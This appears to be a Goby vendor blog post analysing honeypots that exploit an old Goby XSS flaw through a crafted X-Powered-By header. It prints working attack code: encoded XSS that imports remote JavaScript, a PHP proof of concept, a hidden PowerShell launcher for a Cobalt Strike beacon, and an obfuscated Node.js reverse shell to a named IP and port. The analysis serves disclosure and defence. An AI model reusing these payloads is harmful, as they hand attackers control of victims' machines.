# The story behind countering Goby against honeypots

Recently, we collaborated with FORadar to make a plug-in to implement a fully automatic detection process from company name -> enterprise vulnerability. During specific practice, we encountered two interesting honeypots. One of the honeypots has a built-in Weblogic vulnerability. At the same time, It is configured to counteract the payload specifically for the old version of Goby, and the other honeypot has strong concealment. If the team did not have people who specialize in honeypot research, we would almost fall into this honeypot. Of course, the main purpose of this article is to talk about Let’s talk about the first honeypot, and discuss the second one separately when we have the opportunity.

## Origin

![在这里插入图片描述](https://img-blog.csdnimg.cn/4097a5d01eb34a558af7adfc43fbfcd8.png#pic_center)


The beginning of the story is, of course, using Goby to detect a WebLogic remote code execution vulnerability. When preparing to exploit this vulnerability for follow-up actions, team members discovered that this goal was not simple:

![在这里插入图片描述](https://img-blog.csdnimg.cn/0220647644ee4df18e146a4fa42cdff7.jpeg#pic_center)

The header of the return packet carries the countermeasure Payload (the IP has been desensitized);

```html
X-Powered-By: PHP/7&#38;&#35;&#56;&#54;&#59;&#38;&#35;&#49;&#49;&#48;&# 59;&#38;&#35;&#55;&#55;&#59;&#38;&#35;&#54;&#54;&#59; &#55;&#49;&#59;&#38;&#35;&#55;&#52;&#59;&#38;&#35;&#56;&#55;&# 59;&#38;&#35;&#49;&#49;&#55;&#59;&#38;&#35;&#53;&#55;&#59; &#35;&#56;&#53;&#59;&#38;&#35;&#49;&#48;&#52;&#59;&#38;&#35;&# 49;&#49;&#48;&#59;<img src=1 onerror=&#x69;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x28;& #x75;&#x6e;&#x65;&#x73;&#x63;&#x61;&#x70;&#x65;&#x28;& #x27;&#x68;&#x74; ;&#x70;&#x3a;&#x2f;&#x2f;&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;& #x31;&#x3a;&#x38;&#x30;&#x38;&#x30;&#x2f;&#x56;&#x6e;&#x4d;&#x42;&#x47;&#x4a ;&#x57;&#x75;&#x39;&#x55;&#x68;&#x6e;&#x2f;&#x4e;&#x6f;&#x64;&#x65;&#x2e;& #x6a;&#x73;&#x27;&#x29;&#x29;>
```

Obviously this is a string of HTML entity-encoded code, let’s decode it and see;

```html
X-Powered-By: PHP/7&#86;&#110;&#77;&#66;&#71;&#74;&#87;&#117;&#57;&#85;&# 104;&#110;<img src=1 onerror=import(unescape('http://127.0.0.1:8080/VnMBGJWu9Uhn/Node.js'))>
```

It is obvious from this logic that this is a common XSS Payload, the purpose is to execute the `/VnMBGJWu9Uhn/Node.js` file, so let us take a look at this js file;


![在这里插入图片描述](https://img-blog.csdnimg.cn/d932de475a7c4bb9b8fcc338080c2e58.png#pic_center)

You can see that this is a string of nodejs exploit codes. The function is not complicated. First, define a download function to download files from the remote end, and then download different malicious files according to the operating system. If it is Windows, download the executable file directly. , if it is MAC, download the Python3 script file and execute the Python script;

So now the question is, why can this be used to counter Goby? This is actually a very long-standing historical vulnerability. The earliest time of the vulnerability was in October 2021. The vulnerability was fixed and a new version was released that month. As for why the vulnerability exists, it can be traced back to Goby’s component identification capabilities. Goby uses Electron Build client software. In Goby's asset interface, all component names that comply with fingerprint identification rules will be displayed, such as PHP, IIS, etc. For more accurate component identification, Goby will extract version information from the returned data packets. , and displayed in the interface rendering. In the old version of Goby, the version information was not treated harmlessly, resulting in the vulnerability.

## What happens if the Goby I use has this vulnerability?

After the conditions are met, the consequences of this vulnerability are very serious, and the countermeasures party can directly control the PC where Goby is located. But fortunately, this vulnerability is not a 0-click vulnerability, and requires the cooperation and interaction of Goby users to achieve the trigger. condition.

![在这里插入图片描述](https://img-blog.csdnimg.cn/6f5c7c20884c4f488411bda809ab93af.png#pic_center)

As you can see, this is the normal asset interface and version information extraction result, but the version information can be adjusted by constructing an HTTP header, such as this:

```php
#index.php
<?php
header("X-Powered-By: PHP/<img\tsrc=\"x\"\tonerror=\"alert(1);\">");
?>
```

At this time, the results the user sees on the Goby interface are as follows:

![在这里插入图片描述](https://img-blog.csdnimg.cn/d03b04b8a1a04672b616853c8bdd2d63.jpeg#pic_center)

You can clearly see the payload used by the countermeasures on the interface. The XSS code will not be triggered on this page, but if you just click to enter the IP details interface at this time, as shown in the figure below, the XSS code will be triggered.

![在这里插入图片描述](https://img-blog.csdnimg.cn/c44e2d1d4d2548fa9c140012adc9a0cf.jpeg#pic_center)

Of course, the countermeasures party can use this vulnerability to do more things. It can download malicious files from the remote end and trigger execution like the above honeypot device, or it can directly call Powershell to execute ShellCode and go online CS:

```php
#index.php
<?php
header("X-Powered-By: PHP/<img\tsrc=\"x\"\tonerror=import(unescape('http%3A//119.**.**.135%3A18899/js/1. js'))>");
?>
```

```js
// /js/1.js
(function(){require('child_process').exec('powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANAB TAHQAc......(omitted)');})();

```

When the user clicks to enter the IP details page, he will not notice anything, but in fact the powershell code has been quietly executed.


![在这里插入图片描述](https://img-blog.csdnimg.cn/c763d5f1da7e4bcb9e90ddc208c4b06a.jpeg#pic_center)


Successfully launched CS

![在这里插入图片描述](https://img-blog.csdnimg.cn/df5b2c30d0b74ccaac1a1c1ac9a9fea7.jpeg#pic_center)

Therefore, upgrade Goby to the latest version as soon as possible~~ In addition to fixing its own bugs, we have also been launching more easy-to-use and practical new features and look forward to the experience and feedback of the masters.

## How many honeypots are there waiting to be discovered?

As we said before, this is a vulnerability that has been fixed nearly two years ago, but there are still a large number of honeypot devices around the world, waiting for some kind person who still uses the old version of Goby, we can These targets can be quickly found using a FOFA syntax:

```bash
header="img" && header="onerror"
```

It can be seen that there are nearly 1899 honeypot records worldwide, and their payloads are also similar, consistent with the honeypot equipment encountered earlier. What is interesting is that there are dozens of records overseas (~~Foreigners also want to counterattack Goby?~~).

From the perspective of product distribution, this type of honeypots widely covers: Sangfor VPN, Zhiyuan OA, RANZHIOA, Panwei OA, phpMyAdmin and other products and applications that are widely involved in offensive and defensive scenarios. It takes a lot for masters to encounter these assets. A careful mind.

![在这里插入图片描述](https://img-blog.csdnimg.cn/b3fe8dc14d6b4b36b7d4318797f5763a.png#pic_center)


![在这里插入图片描述](https://img-blog.csdnimg.cn/6e52b8829226455c8101aaa2d2ca1b7f.png#pic_center)


We can also slightly adjust the Fofa grammar to see if there is anything new

```bash
header="img" && header="onerror" && header!="PHP"
```

After excluding similar honeypots, only 160 records are left, which obviously has a different use method from the previous honeypot equipment.

![在这里插入图片描述](https://img-blog.csdnimg.cn/df09f55ecdf445a9be0343c96fb13667.png#pic_center)

```bash
X-Powered-By: <img src=# onerror=window.open('https://202.**.***.12/help.html')>
```

After following up on help.html, we found that it was an obfuscated Payload.

```html
<!-- help.html !-->
<!DOCTYPE HTML>
<html>
<head>
     <meta charset="utf-8" />
     <script>
         var _0x1c94=['temp.js','utf8','writeFile','uuid','child_process','fork','/tmp/temp.js'];var _0x4cc5=function(_0x1c94c3,_0x4cc551){ _0x1c94c3=_0x1c94c3-0x0;var _0x3be382=_0x1c94[_0x1c94c3];return _0x3be382;};var _0x551876='';var _0x840f11='\x0avar\x20_0x411b=[\x27net\x2 7,\x27child_process\x27,\x27platform\x27, \x27spawn\x27,\x27/bin/bash\x27,\x27Socket\x27,\x27connect\x27,\x27stdout\x27,\x27pipe\x27];var\x20_0x4b64=function(_0x411be0,_0x4b6451){_0x411be0=_0x411be 0- 0x0;var\x20_0x278a8f=_0x411b[_0x411be0];return\x20_0x278a8f;};var\x20_0x1f656a=\x27106.75.15.34\x27;var\x20_0xb2ca98=\x2722220\x27;(function (){var\x20_0x58cd49=require( \x27os\x27);var\x20_0x20a0b2=require(\x27fs\x27);var\x20_0x2af086=require(_0x4b64(\x270x0\x27));var\x20_0x597913=require(_0x4b64(\x270x1\x27));var\x20_0x269932=_0 x58cd49[_0x4b64(\x270x2 \x27)]();if(_0x269932==\x27win32\x27){var\x20_0x16b7e1=_0x597913[\x27spawn\x27](\x27cmd\x27,[]);}else{var\x20_0x16b7e1=_0x597913[_0x4b64 ( \ x270x3 \ x27)] (_ 0x4b64 (\ x270x4 \ x27), [\ x27-i \ x27]);} Var \ x20_0x293F60 = New \ x20_0x2AF086 [(_ 0x4b64 (\ x270x5 \ \ \ \ \ \ x270x5 \ \ x27)] (); _ 0x293F60 [_0x4b64 (\x270x6\x27)](_0xb2ca98,_0x1f656a,function(){_0x293f60[\x27pipe\x27](_0x16b7e1[\x27stdin\x27]);_0x16b7e1[_0x4b64(\x270x7\x27)][_0x4b64 (\x270x8\x27 )](_0x293f60);_0x16b7e1[\x27stderr\x27][\x27pipe\x27](_0x293f60);});return/a/;}());\x0a';var _0x2b76a6=require('fs'); var _0x512c82=require('os')['platform']();if(_0x512c82=='win32'){_0x2b76a6['writeFile'](_0x4cc5('0x0'),_0x840f11,_0x4cc5('0x1'), function(_0x4af088){});_0x2b76a6[_0x4cc5('0x2')](_0x4cc5('0x3'),_0x551876,_0x4cc5('0x1'),function(_0x3e2b1c){});require(_0x4cc5('0x4') )[_0x4cc5('0x5')](_0x4cc5('0x0'),{'detached':!![]});}else{_0x2b76a6[_0x4cc5('0x2')](_0x4cc5('0x6'),_0x840f11 ,_0x4cc5('0x1'),function(_0x261f0f){});_0x2b76a6['writeFile']('/tmp/uuid',_0x551876,'utf8',function(_0x474cc8){});require('child_process') ['fork'](_0x4cc5('0x6'),{'detached':!![]});}
     </script>
</head>

<body>
</body>
</html>
```

Although most of the code has been obfuscated, it is not difficult to see that the purpose of the payload is to write the malicious file to the disk and call it for execution. However, from the initial syntax, this should not only be targeted at Goby’s honeypot equipment. In Goby No, it is speculated that it may be a certain kind of scanner. This scanner uses a certain framework that not only integrates the browser's parsing environment, but also can directly call the node.js code in the browser's parsing environment, thereby triggering Counterattacker's Payload.

## Epilogue

This concludes the analysis of honeypots. I would also like to give you an advance notice that we have recently done a lot of testing on the best practices for Goby actual combat scenarios, and have achieved some results so far. Related versions and articles will be released in the near future. I hope that the masters will continue to do so. Follow and don’t miss it~

## refer to

- [Nothing to do, counterattack Goby](https://mp.weixin.qq.com/s/EPQZs5eQ4LL--tao93cUfQ)




Goby official website: https://gobysec.net/ If you have any feedback or suggestions, you can submit an issue or contact us in the following ways: GitHub issue: https://github.com/gobysec/Goby/issues WeChat group: Follow the public account "GobySec" and reply with the secret code "Join the group" (Community advantage: you can learn about Goby function releases, activities and other consultations at the first time) Telegram Group: http://t.me/gobies Twitter: https://twitter.com/GobySec
